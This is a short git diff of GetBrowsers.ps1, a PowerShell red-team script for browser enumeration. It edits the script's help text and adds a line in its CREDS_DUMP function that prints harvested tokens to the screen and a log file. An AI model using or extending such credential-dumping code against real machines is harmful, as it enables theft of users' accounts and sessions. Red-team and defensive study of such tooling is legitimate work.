@@ -14,7 +14,7 @@ Author: r00t-3xp10it (SSA RedTeam @2020)
    storage location. If executed with the 2º arg then GetBrowsers will store the logfile in the Input location.
 
 .NOTES
-   PS C:\> Get-Help ./GetBrowsers.ps1 -detailed
+   PS C:\> Get-Help ./GetBrowsers.ps1 -full
    Access This Cmdlet Comment-based Help
 
 .EXAMPLE
@@ -36,6 +36,9 @@ Author: r00t-3xp10it (SSA RedTeam @2020)
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -ADDONS $env:USERPROFILE\Desktop
    Enumerates ALL Browsers addons and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
+
+.INPUTS
+   None. This cmdlet does not accept any inputs besides <-arguments>
 
 .OUTPUTS
    Saves BrowserEnum.log to the selected directory. 'tmp' is the default.
@@ -580,6 +583,7 @@ function CREDS_DUMP {
         }else{
             ## Loop in each string found
             ForEach($token in $Json){
+                write-host "Token: $token" -foregroundcolor green
                 echo "$token" >> $LogFilePath\BrowserEnum.log
             }
         }
